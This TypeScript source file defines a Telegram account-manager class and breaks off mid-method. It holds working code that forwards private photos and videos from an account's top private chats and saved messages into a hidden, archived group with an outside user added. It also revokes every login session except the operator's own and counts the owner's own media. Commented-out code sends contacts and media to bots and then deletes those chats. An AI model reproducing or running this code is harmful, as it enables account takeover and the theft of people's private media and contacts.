import { Api, TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import { TotalList, sleep } from 'telegram/Helpers';
import { LogLevel } from 'telegram/extensions/Logger';
import { MailReader } from '../../IMap/IMap';
import bigInt from 'big-integer';
import { IterDialogsParams } from 'telegram/client/dialogs';
import { EntityLike } from 'telegram/define';
import { contains, getCredentialsForMobile } from '../../utils';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import {
    GroupOptions
} from '../../interfaces/telegram';
import { MediaAlbumOptions } from './types/telegram-types';
import { IterMessagesParams } from 'telegram/client/messages';
import { connectionManager, unregisterClient } from './utils/connection-manager';
import { MessageMediaType, SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';
import { generateTGConfig } from './utils/generateTGConfig';
import { TelegramLogger } from './utils/telegram-logger';
import { withTimeout } from '../../utils/withTimeout';
import isPermanentError from '../../utils/isPermanentError';
import { SendTgMessageDto } from './dto/send-message.dto';

interface MessageScheduleOptions {
    chatId: string;
    message: string;
    scheduledTime: Date;
    replyTo?: number;
    silent?: boolean;
    media?: {
        type: 'photo' | 'video' | 'document';
        url: string;
    };
}

class TelegramManager {
    private logger = new TelegramLogger('TgManager')
    private session: StringSession;
    public phoneNumber: string;
    public client: TelegramClient | null;
    public apiId: number;
    public apiHash: string
    private timeoutErr: NodeJS.Timeout = null;
    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };

    // Media handling constants
    private readonly MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB
    private readonly FILE_DOWNLOAD_TIMEOUT = 60000; // 60 seconds
    private readonly TEMP_FILE_CLEANUP_DELAY = 3600000; // 1 hour
    private readonly THUMBNAIL_CONCURRENCY_LIMIT = 3; // Match maxConcurrentDownloads config
    private readonly THUMBNAIL_BATCH_DELAY_MS = 100; // Small delay between batches
    constructor(sessionString: string, phoneNumber: string) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
    }

    public static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }

    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {
        TelegramManager.activeClientSetup = data;
    }

    public async createGroup() {
        const groupName = "Saved Messages"; // Customize your group name
        const groupDescription = this.phoneNumber; // Optional description
        this.logger.info(this.phoneNumber, "Creating group:", groupName);
        const result: any = await this.client.invoke(
            new Api.channels.CreateChannel({
                title: groupName,
                about: groupDescription,
                megagroup: true,
                forImport: true,
            })
        );
        const { id, accessHash } = result.chats[0];
        this.logger.info(this.phoneNumber, "Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie1"]; // Replace with the list of usernames or user IDs
        this.logger.info(this.phoneNumber, "Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(
            new Api.channels.InviteToChannel({
                channel: new Api.InputChannel({
                    channelId: id,
                    accessHash: accessHash,
                }),
                users: usersToAdd
            })
        );
        this.logger.info(this.phoneNumber, "Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }

    public async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger) {
        const folderId = 1;
        this.logger.info(this.phoneNumber, "Archiving chat", id);
        return await this.client.invoke(
            new Api.folders.EditPeerFolders({
                folderPeers: [
                    new Api.InputFolderPeer({
                        peer: new Api.InputPeerChannel({
                            channelId: id,
                            accessHash: accessHash,
                        }),
                        folderId: folderId,
                    }),
                ],
            })
        );
    }

    private async createOrJoinChannel(channel: string) {
        let channelId: bigInt.BigInteger;
        let channelAccessHash: bigInt.BigInteger;
        if (channel) {
            try {
                const result: any = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                this.logger.info(this.phoneNumber, "Archived chat", channelId);
            } catch (error) {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
            }
        } else {
            const result = await this.createGroup();
            channelId = result.id;
            channelAccessHash = result.accessHash;
            this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
        }
        await this.archiveChat(channelId, channelAccessHash);
        return { id: channelId, accesshash: channelAccessHash }
    }

    public async forwardMedia(channel: string, fromChatId: string) {
        let channelId;
        try {
            this.logger.info(this.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
            let channelAccessHash;
            if (fromChatId) {
                const channelDetails = await this.createOrJoinChannel(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
            } else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                if (chats.length > 0) {
                    const channelDetails = await this.createOrJoinChannel(channel);
                    channelId = channelDetails.id;
                    channelAccessHash = channelDetails.accesshash;
                    const finalChats = new Set(chats.map(chat => chat.chatId));
                    finalChats.add(me.id?.toString());
                    for (const chatId of finalChats) {
                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });
                        this.logger.info(this.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                    }
                }
                this.logger.info(this.phoneNumber, "Completed forwarding messages from top private chats to channel:", channelId);
            }
        } catch (e) {
            this.logger.info(this.phoneNumber, e)
        }
        if (channelId) {
            await this.leaveChannels([channelId.toString()]);
            await connectionManager.unregisterClient(this.phoneNumber);
        }
    }

    public async forwardMediaToBot(fromChatId: string) {
        // const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);
        // try {
        //     if (fromChatId) {
        //         await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);
        //     } else {
        //         const chats = await this.getTopPrivateChats();
        //         const me = await this.getMe();
        //         const finalChats = new Set(chats.map(chat => chat.chatId));
        //         finalChats.add(me.id?.toString());
        //         for (const bot of bots) {
        //             try {
        //                 await this.client.sendMessage(bot, { message: "Start" });
        //                 await sleep(1000);
        //                 await this.client.invoke(
        //                     new Api.folders.EditPeerFolders({
        //                         folderPeers: [
        //                             new Api.InputFolderPeer({
        //                                 peer: await this.client.getInputEntity(bot),
        //                                 folderId: 1,
        //                             }),
        //                         ],
        //                     })
        //                 );
        //             } catch (e) {
        //                 this.logger.info( this.phoneNumber, e)
        //             }
        //         }
        //         try {
        //             const contacts = await this.getContacts();
        //             if ('users' in contacts && Array.isArray(contacts.users)) {
        //                 await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.USER_WARNINGS), contacts);
        //             } else {
        //                 this.logger.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
        //             }
        //         } catch (e) {
        //             this.logger.info( this.phoneNumber, "Failed To Send Contacts File", e)
        //         }
        //         for (const chatId of finalChats) {
        //             const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });
        //             this.logger.info( this.phoneNumber, "Media Messages: ", mediaMessages);
        //             const uniqueMessageIds = Array.from(new Set([
        //                 ...mediaMessages.photo.messages,
        //                 ...mediaMessages.video.messages,
        //                 ...mediaMessages.document.messages,
        //                 ...mediaMessages.roundVideo.messages,
        //                 ...mediaMessages.roundVoice.messages,
        //                 ...mediaMessages.voice.messages,
        //             ]));
        //             const chunkSize = 30;
        //             for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
        //                 const chunk = uniqueMessageIds.slice(i, i + chunkSize);
        //                 const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)
        //                 await this.client.forwardMessages(bot, {
        //                     messages: chunk,
        //                     fromPeer: chatId,
        //                 });
        //                 this.logger.info( this.phoneNumber, `Forwarded ${chunk.length} messages to bot`);
        //             }
        //         }
        //     }
        // } catch (e) {
        //     this.logger.info( this.phoneNumber, e)
        // }
        // for (const bot of bots) {
        //     const result = await this.cleanupChat({ chatId: bot, revoke: false });
        //     await sleep(1000);
        //     await this.deleteChat({ peer: bot, justClear: false });
        //     this.logger.info( this.phoneNumber, "Deleted bot chat:", result);
        // }
    }


    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages: any = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message: Api.Message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            this.logger.info(this.phoneNumber, messageIds)
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });

                    forwardedCount += messageIds.length;
                    this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await sleep(5000); // Sleep for a second to avoid rate limits
                } catch (error) {
                    this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
                }
                await sleep(5000); // Sleep for a second to avoid rate limits
            }
        } while (messages.length > 0);
        this.logger.info(this.phoneNumber, "Left the channel with ID:", toChatId);
        return;
    }

    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {
        const chunkSize = 30; // Number of messages to forward per request
        const totalMessages = messageIds.length;
        let forwardedCount = 0;

        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });

                forwardedCount += chunk.length;
                this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await sleep(5000); // Sleep for a second to avoid rate limits
            } catch (error) {
                this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
            }
        }

        return forwardedCount;
    }

    async destroy(): Promise<void> {
        this.clearTimeoutErr();
        if (this.client) {
            try {
                this.client._errorHandler = null;
                await this.client?.destroy();
                this.client._eventBuilders = [];
                this.session?.delete();
                await sleep(2000);
                this.logger.info(this.phoneNumber, "Client Disconnected Sucessfully");
            } catch (error) {
                parseError(error, `${this.phoneNumber}: Error during client cleanup`);
            } finally {
                if (this.client) {
                    this.client._destroyed = true;
                    if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
                        await this.client._sender.disconnect();
                        // this.logger.info(this.phoneNumber, "Force CleanUp Done!");
                    }
                    this.client = null;
                }
            }
        }
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }

    async getMe(): Promise<Api.User> {
        if (!this.client) throw new Error('Client is not initialized');
        try {
            const me = <Api.User>await this.client.getMe();
            return me;
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting user info:', error);
            throw error;
        }
    }

    clearTimeoutErr() {
        if (this.timeoutErr) {
            clearTimeout(this.timeoutErr)
            this.timeoutErr == null
        }
    }

    async errorHandler(error) {
        const errorDetails = parseError(error, `${this.phoneNumber}: RPC Error`, false);
        if ((error.message && error.message == 'TIMEOUT') || contains(errorDetails.message, ['ETIMEDOUT'])) {
            // await this.client.disconnect();
            this.logger.error(this.phoneNumber, `Timeout error occurred for ${this.phoneNumber}`, error);
            this.timeoutErr = setTimeout(async () => {
                if (this.client && !this.client.connected) {
                    this.logger.debug(this.phoneNumber, "disconnecting client Connection Manually")
                    await unregisterClient(this.phoneNumber)
                } else if (this.client) {
                    this.logger.debug(this.phoneNumber, "Client Connected after Retry")
                } else {
                    this.logger.debug(this.phoneNumber, "Client does not exist")
                }
            }, 10000);
            // await disconnectAll()
            //Do nothing, as this error does not make sense to appear while keeping the client disconnected
        } else {
            // this.logger.error(this.phoneNumber, `Error occurred: ${this.phoneNumber}:`, error);
        }
    }

    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {
        const tgCreds = await getCredentialsForMobile(this.phoneNumber);
        this.apiHash = tgCreds.apiHash
        this.apiId = tgCreds.apiId
        const tgConfiguration = await generateTGConfig(this.phoneNumber);

        try {
            await withTimeout(async () => {
                this.client = new TelegramClient(this.session, this.apiId, this.apiHash, tgConfiguration);
                this.client.setLogLevel(LogLevel.ERROR);
                this.client._errorHandler = this.errorHandler.bind(this)
                await this.client.connect();
                this.logger.info(this.phoneNumber, "Connected Client Succesfully");
                this.clearTimeoutErr()
            },
                {
                    timeout: 180000,
                    errorMessage: `[Tg Manager]\n${this.phoneNumber}: Client Creation TimeOut\n`
                }
            )

            // Verify client was created successfully
            if (!this.client) {
                throw new Error(`Client is null after connection attempt for ${this.phoneNumber}`);
            }

            // Add event handlers if requested
            if (handler && this.client) {
                if (handlerFn) {
                    this.logger.info(this.phoneNumber, "Adding Custom Event Handler")
                    this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());
                } else {
                    this.logger.info(this.phoneNumber, "Adding Default Event Handler")
                    this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());
                }        // Verify client is connected
                if (!this.client.connected) {
                    throw new Error(`Client not connected after connection attempt for ${this.phoneNumber}`);
                }

            }

            return this.client;
        } catch (error) {
            // Clean up on failure
            this.logger.error(this.phoneNumber, "Client creation failed", error);
            if (this.client) {
                try {
                    await this.client.destroy();
                } catch (destroyError) {
                    this.logger.error(this.phoneNumber, "Error destroying failed client", destroyError);
                }
                this.client = null;
            }
            throw error;
        }
    }

    async getGrpMembers(entity: EntityLike) {
        try {
            const result = []
            // Fetch the group entity
            const chat = await this.client.getEntity(entity);

            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {
                this.logger.info(this.phoneNumber, "Invalid group or channel!");
                return;
            }

            this.logger.info(this.phoneNumber, `Fetching members of ${chat.title || (chat as Api.Channel).username}...`);

            // Fetch members
            const participants = await this.client.invoke(
                new Api.channels.GetParticipants({
                    channel: chat,
                    filter: new Api.ChannelParticipantsRecent(),
                    offset: 0,
                    limit: 200, // Adjust the limit as needed
                    hash: bigInt(0),
                })
            );

            if (participants instanceof Api.channels.ChannelParticipants) {
                const users = participants.participants;

                this.logger.info(this.phoneNumber, `Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = <Api.User>await this.client.getEntity(userInfo);
                        // this.logger.info( this.phoneNumber, 
                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || ""} ${userDetails.lastName || ""
                        //     }, Username: ${userDetails.username || ""}`
                        // );
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        })
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            this.logger.info(this.phoneNumber, JSON.stringify(userDetails.id))
                        }
                    } else {
                        this.logger.info(this.phoneNumber, JSON.stringify((user as any)?.userId))
                        // this.logger.info( this.phoneNumber, `could not find enitity for : ${JSON.stringify(user)}`)
                    }
                }
            } else {
                this.logger.info(this.phoneNumber, "No members found or invalid group.");
            }
            this.logger.info(this.phoneNumber, `${result.length}`)
            return result;
        } catch (err) {
            this.logger.error(this.phoneNumber, "Error fetching group members:", err);
        }
    }
    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params: IterDialogsParams) {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            // Convert iterDialogs to array for backward compatibility
            const chats: any[] = [];
            let total = 0;

            for await (const dialog of this.client.iterDialogs(params)) {
                chats.push(dialog);
                total++;
            }

            this.logger.info(this.phoneNumber, "TotalChats:", total);
            // Return in similar format to getDialogs for compatibility
            return Object.assign(chats, { total });
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting dialogs:', error);
            throw error;
        }
    }

    /**
     * Get statistics about media messages in saved messages (self chat)
     * Uses iterMessages for memory-efficient processing - processes messages one at a time
     * instead of loading batches into memory, significantly reducing RAM usage
     * @param limit - Maximum number of messages to analyze (default: 500, max: 10000)
     * @returns Statistics about photos, videos, and movies in saved messages
     */
    async getSelfMSgsInfo(limit: number = 500): Promise<{
        photoCount: number;
        videoCount: number;
        movieCount: number;
        total: number;
        ownPhotoCount: number;
        otherPhotoCount: number;
        ownVideoCount: number;
        otherVideoCount: number;
        analyzedMessages: number;
    }> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const self = <Api.User>await this.client.getMe();
            const selfChatId = self.id;

            let photoCount = 0;
            let ownPhotoCount = 0;
            let ownVideoCount = 0;
            let otherPhotoCount = 0;
            let otherVideoCount = 0;
            let videoCount = 0;
            let movieCount = 0;
            let analyzedMessages = 0;

            // Clamp limit to reasonable range
            const maxLimit = Math.min(Math.max(limit, 1), 10000);

            // Use iterMessages for memory-efficient processing
            // This processes messages one at a time instead of loading batches into memory
            // Significantly reduces RAM usage, especially for large message histories
            for await (const message of this.client.iterMessages(selfChatId, {
                limit: maxLimit,
                // Process messages in reverse chronological order (newest first)
                reverse: false
            })) {
                analyzedMessages++;

                // Skip empty messages
                if (!message) continue;

                // Check for media using proper API types
                const hasMedia = message.media && !(message.media instanceof Api.MessageMediaEmpty);

                if (hasMedia) {
                    // Check for photo
                    if (message.media instanceof Api.MessageMediaPhoto) {
                        photoCount++;
                        // Use message.out to determine if it's own message (more reliable than fwdFrom)
                        if (message.out) {
                            ownPhotoCount++;
                        } else {
                            otherPhotoCount++;
                        }
                    }
                    // Check for video/document with video
                    else if (message.media instanceof Api.MessageMediaDocument) {
                        const document = message.media.document;
                        if (document instanceof Api.Document) {
                            // Check if it's a video by looking for video attributes
                            const isVideo = document.attributes.some(
                                attr => attr instanceof Api.DocumentAttributeVideo
                            );

                            if (isVideo) {
                                videoCount++;
                                if (message.out) {
                                    ownVideoCount++;
                                } else {
                                    otherVideoCount++;
                                }
                            }
                        }
                    }
                }

                // Movie detection based on text content (for links/shared content)
                // Only check if message has text - early exit for performance
                if (message.text) {
                    const text = message.text.toLowerCase();
                    const movieKeywords = ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'];
                    if (contains(text, movieKeywords)) {
                        movieCount++;
                    }
                }

                // Early exit if we've reached the limit
                if (analyzedMessages >= maxLimit) {
                    break;
                }
            }

            // Get total message count (separate lightweight call)
            // This is optional - can be expensive for very large chats
            let totalMessages = analyzedMessages;
            try {
                const firstBatch = await this.client.getMessages(selfChatId, { limit: 1 });
                if (firstBatch.total) {
                    totalMessages = firstBatch.total;
                }
            } catch (totalError) {
                // If getting total fails, use analyzed count as fallback
                this.logger.debug(this.phoneNumber, 'Could not fetch total message count, using analyzed count');
            }

            this.logger.info(this.phoneNumber, `getSelfMSgsInfo: Analyzed ${analyzedMessages} messages`, {
                photoCount,
                videoCount,
                movieCount,
                total: totalMessages
            });

            return {
                total: totalMessages,
                photoCount,
                videoCount,
                movieCount,
                ownPhotoCount,
                otherPhotoCount,
                ownVideoCount,
                otherVideoCount,
                analyzedMessages
            };
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error in getSelfMSgsInfo:', error);
            throw error;
        }
    }

    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = "";
                try {
                    await this.client.invoke(
                        new Api.contacts.AddContact({
                            firstName,
                            lastName,
                            phone: user.mobile,
                            id: user.tgId
                        })
                    );
                } catch (e) {
                    this.logger.info(this.phoneNumber, e)
                }
            }
        } catch (error) {
            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    async addContacts(mobiles: string[], namePrefix: string) {
        try {
            const inputContacts: Api.TypeInputContact[] = [];

            // Iterate over the data array and generate input contacts
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = ""; // Optional, no last name provided

                // Generate client_id as a combination of i and j (for uniqueness)
                // Since we only have one phone per user here, j will always be 0
                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone

                inputContacts.push(new Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user, // mobile number
                    firstName: firstName,
                    lastName: lastName
                }));
            }

            // Call the API to import contacts
            const result = await this.client.invoke(
                new Api.contacts.ImportContacts({
                    contacts: inputContacts,
                })
            );

            this.logger.info(this.phoneNumber, "Imported Contacts Result:", result);


        } catch (error) {
            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    async leaveChannels(chats: string[]) {
        this.logger.info(this.phoneNumber, "Leaving Channels/Groups: initiated!!");
        this.logger.info(this.phoneNumber, "ChatsLength: ", chats.length);

        if (chats.length === 0) {
            this.logger.info(this.phoneNumber, "No chats to leave");
            return;
        }

        // Create a Set for O(1) lookup of chat IDs we need to leave
        // Normalize IDs (with and without -100 prefix) for flexible matching
        const chatsToLeave = new Set<string>();
        for (const id of chats) {
            chatsToLeave.add(id);
            if (id.startsWith('-100')) {
                chatsToLeave.add(id.substring(4)); // Also add without -100
            } else {
                chatsToLeave.add(`-100${id}`); // Also add with -100
            }
        }

        // Build entity map using iterDialogs (memory efficient, can stop early)
        const entityMap = new Map<string, { entity: Api.Channel | Api.Chat, dialog: any }>();
        let foundCount = 0;

        try {
            // Use iterDialogs - processes one dialog at a time, memory efficient
            for await (const dialog of this.client.iterDialogs({})) {
                const entity = dialog.entity;

                // Only process channels and groups
                if (entity instanceof Api.Channel || entity instanceof Api.Chat) {
                    const entityId = entity.id.toString();

                    // Check if this is one we need to leave
                    if (chatsToLeave.has(entityId)) {
                        entityMap.set(entityId, { entity, dialog });
                        foundCount++;

                        // Early exit optimization: if we found all chats, stop iterating
                        if (foundCount >= chats.length) {
                            this.logger.debug(this.phoneNumber, `Found all ${foundCount} chats, stopping iteration early`);
                            break;
                        }
                    }

                    // Also store with alternative ID format for flexible matching
                    if (entityId.startsWith('-100')) {
                        const shortId = entityId.substring(4);
                        if (chatsToLeave.has(shortId) && !entityMap.has(shortId)) {
                            entityMap.set(shortId, { entity, dialog });
                            foundCount++;
                            if (foundCount >= chats.length) break;
                        }
                    } else {
                        const longId = `-100${entityId}`;
                        if (chatsToLeave.has(longId) && !entityMap.has(longId)) {
                            entityMap.set(longId, { entity, dialog });
                            foundCount++;
                            if (foundCount >= chats.length) break;
                        }
                    }
                }
            }

            this.logger.debug(this.phoneNumber, `Found ${entityMap.size} matching chats from dialogs`);
        } catch (error) {
            this.logger.error(this.phoneNumber, "Failed to iterate dialogs:", error);
            throw error;
        }

        if (entityMap.size === 0) {
            this.logger.warn(this.phoneNumber, "No matching chats found in dialogs to leave");
            return;
        }

        const me = await this.client.getMe();
        let successCount = 0;
        let skipCount = 0;

        // Process leaving for each chat
        for (const id of chats) {
            try {
                // Try to find entity in map (check both ID formats)
                let entityData = entityMap.get(id) ||
                    entityMap.get(id.startsWith('-100') ? id.substring(4) : `-100${id}`);

                if (!entityData) {
                    this.logger.warn(this.phoneNumber, `Chat ${id} not found in dialogs, skipping`);
                    skipCount++;
                    continue;
                }

                const { entity } = entityData;
                let chatType: string;
                let left = false;

                // Determine chat type and leave accordingly
                if (entity instanceof Api.Channel) {
                    // Channel or Supergroup - use channels.LeaveChannel
                    await this.client.invoke(
                        new Api.channels.LeaveChannel({
                            channel: entity
                        })
                    );
                    chatType = entity.broadcast ? 'channel' : 'supergroup';
                    left = true;
                } else if (entity instanceof Api.Chat) {
                    // Regular Group - use messages.DeleteChatUser
                    await this.client.invoke(
                        new Api.messages.DeleteChatUser({
                            chatId: entity.id,
                            userId: me.id,
                            revokeHistory: false
                        })
                    );
                    chatType = 'group';
                    left = true;
                } else {
                    this.logger.warn(this.phoneNumber, `Unknown entity type for ${id}, skipping`);
                    skipCount++;
                    continue;
                }

                if (left) {
                    this.logger.info(this.phoneNumber, `Left ${chatType}: ${id}`);
                    successCount++;
                }

                // Delay between operations to avoid rate limits
                if (chats.length > 1) {
                    await sleep(3000);
                }
            } catch (error) {
                const errorDetails = parseError(error, `${this.phoneNumber} Failed to leave chat ${id}:`, false);

                if (isPermanentError(errorDetails)) {
                    this.logger.error(this.phoneNumber, `Permanent error leaving ${id}:`, errorDetails.message);
                    skipCount++;
                    continue;
                }

                // Log non-permanent errors but continue
                this.logger.warn(this.phoneNumber, `Error leaving ${id}:`, errorDetails.message);
                skipCount++;
            }
        }

        this.logger.info(
            this.phoneNumber,
            `Leaving Channels/Groups: Completed! Success: ${successCount}, Skipped: ${skipCount}, Total: ${chats.length}`
        );
    }

    async getEntity(entity: Api.TypeEntityLike) {
        return await this.client?.getEntity(entity)
    }

    async joinChannel(entity: Api.TypeEntityLike) {
        this.logger.info(this.phoneNumber, "trying to join channel: ", `@${entity}`)
        return await this.client?.invoke(
            new Api.channels.JoinChannel({
                channel: await this.client?.getEntity(entity)
            })
        );
    }

    connected() {
        return this.client.connected;
    }

    async connect() {
        return await this.client.connect();
    }

    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }

    private isAuthMine(auth: Api.Authorization): boolean {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];

        return authCriteria.some(criterion => {
            const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';

            if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) {
                return true;
            }

            if ('values' in criterion) {
                return criterion.values.some(value =>
                    fieldValue.includes(value.toLowerCase())
                );
            }

            return fieldValue.includes(criterion.value.toLowerCase());
        });
    }


    private async resetAuthorization(auth: Api.Authorization): Promise<void> {
        try {
            await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
        } catch (error) {
            parseError(error, `Failed to reset authorization for ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
        }
    }

    async getAuths(): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        return result;
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chatData = [];
        let total = 0;

        // Use iterDialogs for memory-efficient iteration
        for await (const chat of this.client.iterDialogs({ limit: 500 })) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
            total++;
        }

        this.logger.info(this.phoneNumber, "TotalChats:", total);
        return chatData;
    }
    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });

        const result = await Promise.all(messages.map(async (message: Api.Message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;

            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));

        return result;
    }

    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {
        if (message.media instanceof Api.MessageMediaPhoto) {
            this.logger.info(this.phoneNumber, "messageId image:", message.id);
            const photo = <Api.Photo>message.photo;
            const sizes = photo?.sizes || [];

            // Prefer medium size, fallback to largest available
            const preferredSize = sizes.find((s: any) => s.type === 'm') ||
                sizes.find((s: any) => s.type === 'x') ||
                sizes[sizes.length - 1] ||
                sizes[0];

            return await this.client.downloadMedia(message, {
                thumb: preferredSize || sizes[0]
            });

        } else if (message.media instanceof Api.MessageMediaDocument &&
            (message.document?.mimeType?.startsWith('video') ||
                message.document?.mimeType?.startsWith('image'))) {
            this.logger.info(this.phoneNumber, "messageId video:", message.id);
            const thumbs = message.document?.thumbs || [];

            // Prefer medium thumb, fallback to largest available
            const preferredThumb = thumbs.find((t: any) => t.type === 'm') ||
                thumbs[thumbs.length - 1] ||
                thumbs[0];

            return await this.client.downloadMedia(message, {
                thumb: preferredThumb || thumbs[0]
            });
        }
        return null;
    }

    /**
     * Get thumbnail buffer from a message (reusable method)
     * @param message - Telegram message with media
     * @returns Buffer containing thumbnail or null if not available
     */
    private async getThumbnailBuffer(message: Api.Message): Promise<Buffer | null> {
        try {
            if (message.media instanceof Api.MessageMediaPhoto) {
